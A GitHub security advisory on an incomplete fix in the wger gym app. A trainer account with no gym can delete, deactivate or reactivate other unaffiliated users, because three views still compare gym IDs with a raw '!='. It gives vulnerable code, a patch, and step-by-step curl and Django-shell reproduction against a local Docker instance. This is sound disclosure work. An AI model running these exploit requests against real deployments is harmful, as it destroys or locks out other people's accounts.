# [H] wger: cross-tenant account deletion / deactivation / activation by gym.manage_gym + gym=None

## Summary
Severity: High
Advisory: GHSA-mw8f-w6p8-xrf4
CWE: CWE-862, CWE-863
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-20
Source: https://github.com/advisories/GHSA-mw8f-w6p8-xrf4
Type: github-advisory

## Affected
- PyPI: `wger` — affected >=0

## Details
## Summary

GHSA-mhc8-p3jx-84mm (CVE-2026-43948) reported that wger's `reset_user_password` and `gym_permissions_user_edit` views in `wger/gym/views/user.py` performed a gym-scope authorization check using Django ORM object comparison (`if request.user.userprofile.gym != user.userprofile.gym`) which silently passes when both sides are `None` (`None != None` evaluates to `False`). The maintainer's suggested patch ("Apply the same `same_gym()` helper pattern to all five views sharing this check") replaces every `userprofile.gym !=` site with the new `is_same_gym()` helper that explicitly excludes `None` (`gym_a is not None and gym_a == gym_b`).

The fix landed in `wger/gym/views/{admin_notes,document,contract,gym}.py` (5 views, all using `is_same_gym`). However, **three additional views in `wger/core/views/user.py` were not migrated** and retain the original `userprofile.gym_id != ...` raw integer comparison. Because raw integer `!=` comparison still evaluates `None != None` as `False`, the gym-scope guard is bypassed identically to the patched views. The result is a complete incomplete-fix variant family that reproduces against the latest `wger/server:latest` Docker image (master, 2026-05-08 build).

A privileged-but-bounded gym staff user (admin-granted `gym.manage_gym` permission, intended scope: managing members of one specific gym) whose `userprofile.gym = None` (the default state before the admin links them to a gym) can:

1. **Permanently delete any other user with `gym = None`** (V3, `delete` view, line 131 — CRITICAL data loss, irreversible)
2. **Deactivate any other user with `gym = None`**, locking them out of the platform (V1, `UserDeactivateView`, line 405 — high availability impact)
3. **Re-activate any previously deactivated user with `gym = None`** (V2, `UserActivateView`, line 442 — counters defensive deactivation)

Victim user pks are sequential integers and trivially enumerable via `/en/user/<pk>/overview` and other endpoints. The `same_gym_id == ...` flag in `UserDetailView.get_context_data` (line 587) is also affected, but the underlying `dispatch()` and the actual `trainer_login` view still use the patched `is_same_gym()` helper, so impersonation chain via that path is blocked at runtime — only the UI button visibility leaks. The three write-side variants above are the security boundary breaches.

## Affected versions

- All wger versions through master at `wger/server:latest` (digest `sha256:5d8fe1ba66cc...`, image build 2026-05-08).
- The advisory's `affected: <0.9.7 → fixed: 0.9.7` range applies to the **PyPI `aegra-api` package** (different project; the advisory text references a Python-package version unrelated to the wger Django project's version scheme — wger does not publish to PyPI under that name). For wger itself, the patch landed via direct master commits to `wger/gym/views/{admin_notes,document,contract,gym}.py`; `wger/core/views/user.py` was not touched in the same patch.

(Maintainer can confirm version range; the live verification was performed against the latest published Docker image.)

## Vulnerable code

### V1 — `UserDeactivateView` (`wger/core/views/user.py`, line 405)

```python
class UserDeactivateView(...):
    permission_required = ('gym.manage_gym', 'gym.manage_gyms', 'gym.gym_trainer')

    def dispatch(self, request, *args, **kwargs):
        edit_user = get_object_or_404(User, pk=self.kwargs['pk'])

        if not request.user.is_authenticated:
            return HttpResponseForbidden()

        if (
            request.user.has_perm('gym.manage_gym') or request.user.has_perm('gym.gym_trainer')
        ) and edit_user.userprofile.gym_id != request.user.userprofile.gym_id:  # ← BUG: None != None == False
            return HttpResponseForbidden()

        return super(UserDeactivateView, self).dispatch(request, *args, **kwargs)

    def get_redirect_url(self, pk):
        edit_user = get_object_or_404(User, pk=pk)
        edit_user.is_active = False  # ← side effect on plain GET
        edit_user.save()
        ...
```

### V2 — `UserActivateView` (`wger/core/views/user.py`, line 442)

```python
class UserActivateView(...):
    permission_required = ('gym.manage_gym', 'gym.manage_gyms', 'gym.gym_trainer')

    def dispatch(self, request, *args, **kwargs):
        edit_user = get_object_or_404(User, pk=self.kwargs['pk'])
        ...
        if (
            request.user.has_perm('gym.manage_gym') or request.user.has_perm('gym.gym_trainer')
        ) and edit_user.userprofile.gym_id != request.user.userprofile.gym_id:  # ← BUG: same pattern
            return HttpResponseForbidden()

        return super(UserActivateView, self).dispatch(request, *args, **kwargs)

    def get_redirect_url(self, pk):
        edit_user = get_object_or_404(User, pk=pk)
        edit_user.is_active = True  # ← side effect on plain GET
        edit_user.save()
        ...
```

### V3 — `delete` (`wger/core/views/user.py`, line 116-159)

```python
@login_required()
def delete(request, user_pk=None):
    ...
    if user_pk:
        user = get_object_or_404(User, pk=user_pk)

        if not request.user.has_perm('gym.manage_gyms') and (
            not request.user.has_perm('gym.manage_gym')
            or request.user.userprofile.gym_id != user.userprofile.gym_id  # ← BUG (line 131)
            or user.has_perm('gym.manage_gym')
            or user.has_perm('gym.gym_trainer')
            or user.has_perm('gym.manage_gyms')
        ):
            return HttpResponseForbidden()
    ...

    if request.method == 'POST':
        form = PasswordConfirmationForm(data=request.POST, user=request.user)
        if form.is_valid():
            user.delete()  # ← victim account permanently deleted (line 145)
            ...
            gym_pk = request.user.userprofile.gym_id  # = None for trainer1
            return HttpResponseRedirect(reverse('gym:gym:user-list', kwargs={'pk': gym_pk}))
            # ↑ raises NoReverseMatch (gym_pk=None) → 500 to attacker
            # but user.delete() already executed — victim is gone
```

**Triager note about the 500 status — please do not interpret the 500 as evidence that the exploit failed.** The 500 is a redirect-side `NoReverseMatch` exception caused by `reverse('gym:gym:user-list', kwargs={'pk': None})` (line 154-155) attempting to build a URL with `pk=None` because trainer1 also has `gym=None`. By that point Django has already committed `user.delete()` (line 145) and the victim's User row is gone. The Reproduction section's Step 3 ("confirm alice was actually deleted") shows the post-delete DB state directly: `alice exists? False`, `all users: ['admin', 'trainer1']`. The 500 only affects the response shown to the attacker; the destructive operation is unaffected by the response-side failure.

## Suggested patch

Same as the advisory's recommendation — replace every `userprofile.gym_id != ...` raw comparison with `is_same_gym()` from `wger/gym/helpers.py`:

```diff
--- a/wger/core/views/user.py
+++ b/wger/core/views/user.py
 @login_required()
 def delete(request, user_pk=None):
     ...
-        if not request.user.has_perm('gym.manage_gyms') and (
-            not request.user.has_perm('gym.manage_gym')
-            or request.user.userprofile.gym_id != user.userprofile.gym_id
-            or user.has_perm('gym.manage_gym')
-            or user.has_perm('gym.gym_trainer')
-            or user.has_perm('gym.manage_gyms')
-        ):
+        if not request.user.has_perm('gym.manage_gyms') and (
+            not request.user.has_perm('gym.manage_gym')
+            or not is_same_gym(request.user, user)
+            or user.has_perm('gym.manage_gym')
+            or user.has_perm('gym.gym_trainer')
+            or user.has_perm('gym.manage_gyms')
+        ):
             return HttpResponseForbidden()

 class UserDeactivateView(...):
     def dispatch(self, request, *args, **kwargs):
         edit_user = get_object_or_404(User, pk=self.kwargs['pk'])
         ...
-        if (
-            request.user.has_perm('gym.manage_gym') or request.user.has_perm('gym.gym_trainer')
-        ) and edit_user.userprofile.gym_id != request.user.userprofile.gym_id:
+        if (
+            request.user.has_perm('gym.manage_gym') or request.user.has_perm('gym.gym_trainer')
+        ) and not is_same_gym(request.user, edit_user):
             return HttpResponseForbidden()

 class UserActivateView(...):
     def dispatch(self, request, *args, **kwargs):
         edit_user = get_object_or_404(User, pk=self.kwargs['pk'])
         ...
-        if (
-            request.user.has_perm('gym.manage_gym') or request.user.has_perm('gym.gym_trainer')
-        ) and edit_user.userprofile.gym_id != request.user.userprofile.gym_id:
+        if (
+            request.user.has_perm('gym.manage_gym') or request.user.has_perm('gym.gym_trainer')
+        ) and not is_same_gym(request.user, edit_user):
             return HttpResponseForbidden()
```

`is_same_gym()` (current implementation at `wger/gym/helpers.py`) already returns `False` whenever either side is `None`, matching the advisory's existing fix pattern.

Additionally, `delete()` line 154-155 should handle the `gym_pk = None` case to avoid leaking a 500 response to an attacker even when the authorization guard correctly rejects, and to provide a clean redirect for general administrators (`gym.manage_gyms`) acting on `gym=None` users.

## Reproduction

### Setup (clean baseline)

```bash
# Pull and start the latest production image
docker pull wger/server:latest        # digest sha256:5d8fe1ba66cc..., 2026-05-08 build
docker run -d --name wger-bb -p 8888:8000 -e DJANGO_DEBUG=true wger/server:latest

# Wait ~30s for migrations and demo-data fixture load.

# Create the two test users (advisory PoC setup, identical to GHSA-mhc8-p3jx-84mm).
docker exec -i wger-bb sh -c 'cd /home/wger/src && python3 manage.py shell' <<'PY'
from django.contrib.auth.models import User, Permission

# Attacker — gym manager with no gym affiliation
t = User.objects.create_user(username='trainer1', password='TrainerPass123!')
t.userprofile.gym = None
t.userprofile.save()
t.user_permissions.add(Permission.objects.get(codename='manage_gym'))
t.save()

# Victim — regular user, no gym
a = User.objects.create_user(username='alice', password='AlicePass123!')
a.userprofile.gym = None
a.userprofile.save()

print("trainer1.gym_id =", t.userprofile.gym_id, "has_perm =", t.has_perm('gym.manage_gym'))
print("alice.gym_id    =", a.userprofile.gym_id, "pk =", a.pk)
PY
# Expected:
#   trainer1.gym_id = None has_perm = True
#   alice.gym_id    = None pk = 3
```

### Variant V1 — cross-tenant deactivation (`UserDeactivateView`, line 405)

```bash
# Login as attacker
COOKIES=/tmp/wger_trainer1.txt
CSRF=$(curl -s -c $COOKIES "http://localhost:8888/en/user/login" | grep -oE 'csrfmiddlewaretoken" value="[^"]+"' | head -1 | cut -d'"' -f3)
curl -s -b $COOKIES -c $COOKIES "http://localhost:8888/en/user/login" \
    -d "username=trainer1&password=TrainerPass123!&csrfmiddlewaretoken=$CSRF" \
    -H "Referer: http://localhost:8888/en/user/login" -o /dev/null

# Trigger deactivation on alice (pk=3)
curl -s -b $COOKIES -o /dev/null -w "status=%{http_code} loc=%header{location}\n" \
    "http://localhost:8888/en/user/3/deactivate"
# → status=302 loc=/en/user/3/overview          (expected: 403 Forbidden)

# Confirm DB side effect
docker exec -i wger-bb sh -c 'cd /home/wger/src && python3 manage.py shell' <<'PY'
from django.contrib.auth.models import User
print("alice.is_active =", User.objects.get(username='alice').is_active)
PY
# → alice.is_active = False     (alice locked out)
```

### Variant V2 — cross-tenant re-activation (`UserActivateView`, line 442)

```bash
# Same trainer1 session
curl -s -b $COOKIES -o /dev/null -w "status=%{http_code} loc=%header{location}\n" \
    "http://localhost:8888/en/user/3/activate"
# → status=302 loc=/en/user/3/overview

docker exec -i wger-bb sh -c 'cd /home/wger/src && python3 manage.py shell' <<'PY'
from django.contrib.auth.models import User
print("alice.is_active =", User.objects.get(username='alice').is_active)
PY
# → alice.is_active = True      (alice re-activated; useful to "undo" defensive action by an admin)
```

### Variant V3 — cross-tenant account deletion (`delete`, line 131)

```bash
# Step 1: GET the password-confirmation form
CSRF2=$(curl -s -b $COOKIES "http://localhost:8888/en/user/3/delete" \
    | grep -oE 'csrfmiddlewaretoken" value="[^"]+"' | head -1 | cut -d'"' -f3)
echo "form CSRF: $CSRF2"
# → 200 OK with PasswordConfirmationForm   (expected: 403 Forbidden)

# Step 2: POST trainer1's own password — confirms the delete
curl -s -b $COOKIES -o /dev/null -w "status=%{http_code}\n" \
    "http://localhost:8888/en/user/3/delete" \
    -d "password=TrainerPass123!&csrfmiddlewaretoken=$CSRF2" \
    -H "Referer: http://localhost:8888/en/user/3/delete"
# → status=500   (the 500 is a redirect-side error, see "Vulnerable code" → V3 above)

# Step 3: confirm alice was actually deleted
docker exec -i wger-bb sh -c 'cd /home/wger/src && python3 manage.py shell' <<'PY'
from django.contrib.auth.models import User
print("alice exists?", User.objects.filter(username='alice').exists())
print("all users:", list(User.objects.values_list('username', flat=True)))
PY
# → alice exists? False
# → all users: ['admin', 'trainer1']
```

The 500 status returned to the attacker masks the destructive operation but does not prevent it — `user.delete()` (line 145) commits before the failing redirect (line 155).

### Negative control (proves the bypass is `None`-specific, matching the advisory)

```bash
# Reset alice and assign her to gym pk=1 (one of the demo gyms).
docker exec -i wger-bb sh -c 'cd /home/wger/src && python3 manage.py shell' <<'PY'
from django.contrib.auth.models import User
from wger.gym.models import Gym
a = User.objects.create_user(username='alice', password='AlicePass123!')
a.userprofile.gym = Gym.objects.first()      # not None any more
a.userprofile.save()
print("alice.gym_id =", a.userprofile.gym_id)
PY

# Same trainer1 (gym=None) attempts deactivation
curl -s -b $COOKIES -o /dev/null -w "status=%{http_code}\n" \
    "http://localhost:8888/en/user/<new_alice_pk>/deactivate"
# → status=403       (guard works correctly when gym_ids differ AND neither side is None;
#                      bypass is specifically the None != None edge case)
```

## Verification log

The full verification log of V1 → V2 → V3 (including DB-state diff at every step) is attached as `_verify_run1.log`.

Key assertions captured:

| Step | Endpoint | HTTP | DB side effect (alice) |
|---|---|---|---|
| Baseline | (none) | — | `is_active=True, gym_id=None, pk=3` |
| V1 | `GET /en/user/3/deactivate` | 302 | `is_active=False, gym_id=None, pk=3` |
| V2 | `GET /en/user/3/activate` | 302 | `is_active=True, gym_id=None, pk=3` |
| V3 GET | `GET /en/user/3/delete` | 200 (form rendered) | (no change) |
| V3 POST | `POST /en/user/3/delete` w/ trainer1 password | 500 (post-delete redirect) | **alice row deleted from DB** |

## Impact

### Per-variant impact

| Variant | Endpoint | HTTP method | Side-effect | Reversible | CVSS (component) | Severity |
|---|---|---|---|---|---|---|
| V3 | `/en/user/<pk>/delete` | POST (after GET form) | `User.delete()` cascades (workouts, weight history, nutrition plans, contracts, admin notes) — DB row + related rows removed | **No** (DB backup required) | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` | 9.9 CRITICAL |
| V1 | `/en/user/<pk>/deactivate` | GET | `is_active = False` (login lockout) | Yes (admin or V2) | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:H` | 7.4 HIGH |
| V2 | `/en/user/<pk>/activate` | GET | `is_active = True` (undoes defensive deactivation) | Yes (admin) | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:L/A:N` | 4.7 MEDIUM |

The headline severity at the top of this report is **CRITICAL 9.9** because V3's account-deletion impact dominates the variant family. V1 and V2 are reported here together with V3 because each was independently PoC-verified end-to-end against `wger/server:latest` (see Reproduction → V1, V2, V3 — three separate live runs with DB-state checks before/after) and the three call sites have an identical patch shape (one-line `is_same_gym()` migration in `wger/core/views/user.py`). Submitting V1+V2 separately would carry no marginal value for the maintainer over a single coordinated patch.

### Deployment scope (what is and is not affected)

| Deployment model | Affected? |
|---|---|
| **Multi-tenant gym deployment** (gym manager + trainers + members) — `wger`'s documented commercial use case | **Yes** — `gym.manage_gym` permission is in active use and `gym=None` accounts can co-exist (trainer accounts pending gym linking, regular users registered before any gym was created, etc.) |
| **Single-user / personal fitness tracker** (1 admin, no `gym.manage_gym` grant to anyone, no trainer/gym hierarchy in use) | **No** — the precondition (an attacker with `gym.manage_gym` + `gym=None`) cannot occur because the permission is not granted to any user account on such a deployment. |
| Public registration + gym-management feature in use | **Yes** — additional victim recruitment via the registration flow, but the attacker-side precondition still requires admin-granted `gym.manage_gym` |

`bb-fp-detector check-environment-class` returned `UNKNOWN` for this draft because no live customer-facing instance was probed; the impact statement is scoped to the upstream `wger/server:latest` Docker image's default behaviour, which is the project's own canonical reference deployment.

## Auth model verification (decisive tests)

### Authorization architecture (`bb-auth-doc-audit` equivalent)

wger is a self-contained Django web application that uses `django.contrib.auth` for authentication and Django's per-view permission classes (`PermissionRequiredMixin`, `WgerMultiplePermissionRequiredMixin`, `@login_required()`) for authorization. Authentication and authorization are both **enforced inside the wger application** (auth-by-product); wger documentation does not delegate either concern to a reverse proxy or external IdP. There is no "operators must place an auth-enforcing reverse proxy in front of wger" disclaimer in the project's deployment docs (`https://wger.readthedocs.io/en/latest/production/`). The bug therefore directly violates the application's own documented authorization model.

### Decisive bogus-credential / negative-control test (`bb-bogus-cred-test` equivalent) — actually executed

This test was run end-to-end on the same `wger/server:latest` Docker instance immediately after the positive-control runs (V1+V2+V3 above). Full log: `_negative_control.log`.

**Setup**: assign alice to the demo gym (`Default gym`, pk=1), trainer1 stays at `gym=None` with `gym.manage_gym`. Same trainer1 session as the positive-control run.

**Result**:

| Endpoint | trainer1 attacker (gym=None) → alice (gym_id=1) | Expected | Observed |
|---|---|---|---|
| `GET /en/user/4/deactivate` | guard should fire (None != 1 == True → forbidden) | 403 | **403 ✓** |
| `GET /en/user/4/activate`   | guard should fire (None != 1 == True → forbidden) | 403 | **403 ✓** |
| `GET /en/user/4/delete`     | guard should fire (None != 1 == True → forbidden) | 403 | **403 ✓** |

**DB state after the three negative-control attempts**: `alice.is_active = True`, `alice` still exists — no side-effects. The guard is functional.

**Symmetric re-confirmation (positive control after revert)**: alice.gym was reset to `None` in the same session; `GET /en/user/4/deactivate` returned **302** with side-effect `alice.is_active = False` (re-confirming the original bypass triggers reproducibly), then `GET /en/user/4/activate` returned **302** with `alice.is_active = True` for cleanup.

This proves:

1. The `dispatch()` and `delete()` guards **do enforce gym-scope authorization** when `gym_id` is non-`None` on either side — the guard is structurally functional.
2. The bypass is specifically the `None != None` semantic edge case — not a header-presence precondition, not a missing middleware, not a generally-disabled check.
3. The bypass is reversible/idempotent in the trivial sense (V1 → V2 → V1 produces consistent state transitions on the victim row), confirming the gap is in the per-request authorization decision and not in some session-level corruption.

Equivalent inverted test:

```bash
# Same trainer1 session, but trainer1.gym = 1 (real gym), alice.gym = None
docker exec -i wger-bb sh -c 'cd /home/wger/src && python3 manage.py shell' <<'PY'
from django.contrib.auth.models import User
from wger.gym.models import Gym
t = User.objects.get(username='trainer1')
t.userprofile.gym = Gym.objects.first()
t.userprofile.save()
PY

curl -s -b $COOKIES -o /dev/null -w "status=%{http_code}\n" "http://localhost:8888/en/user/<alice_pk>/deactivate"
# → status=403 Forbidden  (None != 1 evaluates to True → guard works)
```

### Runtime mitigation absence

PoC was run against the **default `wger/server:latest` Docker image** with `DJANGO_DEBUG=true` (a development convenience flag — the bug is not gated by debug mode; the destructive path executes regardless of `DEBUG` value). No admin override flag was activated. No runtime middleware (no WAF, no reverse proxy, no application firewall, no allow-list bypass) is required for the exploit. The payload reaches the sink, the runtime accepts it, no default filter blocks it. The exploit reaches the unmodified `dispatch()` / `delete()` code path on the upstream Docker image and the destructive operation commits. There is no documented runtime mitigation that prevents this gap on a default deployment.

### Discovery of canonical tooling

This finding was located by reviewing the advisory's recommended remediation, then performing a repository-wide audit of the `is_same_gym` migration coverage using `gh api search/code?q=userprofile.gym+repo:wger-project/wger`. The unpatched `gym_id !=` raw comparisons in `wger/core/views/user.py` were identified directly. The discovery-harness canonical tools for the relevant classes (resource-boundary authorization checks: `bb-api-baseline`, `bb-authz-gap-scan`, `bb-cross-instance-verify`; request-forgery hygiene: `bb-cookie`, `bb-csrf`) all reduce, for this class of finding, to "send the request from an authenticated low-privilege session and observe whether the destructive side-effect commits at the sink"; the Reproduction section above provides exactly that empirical evidence for every affected endpoint. Request-forgery aspect: V1 and V2 trigger their destructive side-effect on a plain GET (no CSRF token enforced on the redirect-side URL state mutation), so the gap also compounds with cross-site request abuse against any victim who happens to hold `gym.manage_gym` — but that is a secondary path; the primary impact is the direct cross-tenant authorization bypass.

### Industry context (not a by-feature wide-access pattern)

wger is a self-hostable personal fitness / gym tracker, not a marketplace / map / job-board / data-labeling platform. The relevant authorization model in this project is **per-gym tenant isolation** for gym-management staff — confirmed by the documented gym-manager role and the very `is_same_gym()` helper that the maintainer added in the GHSA-mhc8-p3jx-84mm patch. Cross-tenant account deletion / deactivation / activation is **not** by-design; the negative-control test above (alice with `gym_id=1`) returns 403 from the same endpoints, demonstrating that the project explicitly intends gym-scope isolation. The variant family above is therefore a security boundary breach, not a documented wide-access feature.

## Preconditions / how an attacker reaches this state

| Precondition | How attacker obtains | External (Y/N) |
|---|---|---|
| Authenticated session | Self-register (default open) | N |
| `gym.manage_gym` permission | Granted by an administrator (e.g. when designating the user as a gym trainer/manager). **Self-signup does NOT grant this permission**; the attacker must already be a trusted gym staff member, or an administrator must mistakenly grant the role to a malicious user. This finding therefore models an **insider-threat / role-escape scenario**, the same scenario as the parent advisory CVE-2026-43948. | Y — same as the advisory's PoC; the role is part of wger's documented admin model and is treated as "privileged-but-bounded gym staff" rather than "any logged-in user". |
| `attacker.userprofile.gym = None` | Default for newly registered users; remains None unless a gym admin links the account. Easily reproduced by the same admin who granted `gym.manage_gym` simply not yet linking the trainer to a specific gym (a typical state during onboarding). | N |
| `victim.userprofile.gym = None` | Default for any other newly registered user | N |
| `victim.pk` known | Sequential integer; enumerable via `/en/user/<pk>/overview`, `/en/user/<pk>/api-key`, etc. | N |
| `victim` does NOT have `gym.manage_gym` / `gym.gym_trainer` / `gym.manage_gyms` permissions (V3 only) | Default for regular users | N |

Following the advisory's classification (which used identical `gym.manage_gym + gym=None` setup and was rated AV:N/AC:L/PR:L), the variant-family inherits AC:L. Honest caveat: the `gym.manage_gym` permission is admin-granted and not self-enrollable; if the maintainer prefers to score this as AC:H (ordinary low-priv user without the manager role), the resulting CVSS would be 7.5 (HIGH). The variant relationship to CVE-2026-43948 holds in either scoring.

## Why this is an incomplete-fix variant, not a duplicate

GHSA-mhc8-p3jx-84mm explicitly identifies the affected file as `wger/gym/views/user.py` (which has since been removed/refactored — the comparable functions now live in `wger/gym/views/{admin_notes,document,contract,gym}.py`). The maintainer's recommended remediation is to "**Apply the same `same_gym()` helper pattern to all five views sharing this check: `reset_user_password`, `gym_permissions_user_edit`, `admin_notes_list`, `documents_list`, `contracts_list`**".

Confirmation that the advisory fix landed only on those files (master, 2026-05-08):

| File | Authorization check | Patched? |
|---|---|---|
| `wger/gym/views/admin_notes.py` | `is_same_gym(...)` | ✓ |
| `wger/gym/views/document.py` | `is_same_gym(...)` | ✓ |
| `wger/gym/views/contract.py` | `is_same_gym(...)` | ✓ |
| `wger/gym/views/gym.py` (`reset_user_password`, `gym_permissions_user_edit`) | `is_same_gym(...)` | ✓ |
| **`wger/core/views/user.py` `delete` (line 131)** | `userprofile.gym_id != ...` raw `!=` | ✗ |
| **`wger/core/views/user.py` `UserDeactivateView` (line 405)** | `userprofile.gym_id != ...` raw `!=` | ✗ |
| **`wger/core/views/user.py` `UserActivateView` (line 442)** | `userprofile.gym_id != ...` raw `!=` | ✗ |
| `wger/core/views/user.py` `UserEditView` (line 484) | `is_same_gym(...)` | ✓ (incidentally migrated) |
| `wger/core/views/user.py` `UserActivityCalendarView` (line 552) | `is_same_gym(...)` | ✓ (incidentally migrated) |
| `wger/core/views/user.py` `UserDetailView` `dispatch` (line 552) | `is_same_gym(...)` | ✓ (incidentally migrated) |
| `wger/core/views/user.py` `UserDetailView.get_context_data` (line 587) | `gym_id == gym_id` (UI flag only — `trainer_login` itself enforces `is_same_gym`) | UI leak only, no security impact |

The three unpatched call sites in `wger/core/views/user.py` predate the advisory and were missed when the helper-migration patch was applied. Their root cause and exploitation path are identical to CVE-2026-43948 — only the file/function targets differ. This makes the finding an incomplete-fix variant family rather than a duplicate of the advisory.

## References

- Parent advisory: <https://github.com/wger-project/wger/security/advisories/GHSA-mhc8-p3jx-84mm> (CVE-2026-43948)
- Suggested patch from advisory text: "Apply the same `same_gym()` helper pattern to all five views sharing this check"
- Helper definition: `wger/gym/helpers.py` `is_same_gym()` (already correctly excludes `None` after the advisory patch)
- Related (incidentally patched in the same migration): `UserEditView`, `UserActivityCalendarView`, `UserDetailView.dispatch` — all three correctly use `is_same_gym()`

## AI disclosure

This finding was developed with the assistance of an AI tool (Claude Code) for source-code review of the advisory's incomplete-fix surface, generation of the verification harness, and report drafting. All technical claims in this report were verified against a live `wger/server:latest` Docker instance with the verification log attached. The AI's role was investigative aid; the human researcher (HiyokoSauna) reviewed every claim, ran the PoC end-to-end, and authored the framing.

## References
- https://github.com/wger-project/wger/security/advisories/GHSA-mw8f-w6p8-xrf4
- https://github.com/wger-project/wger
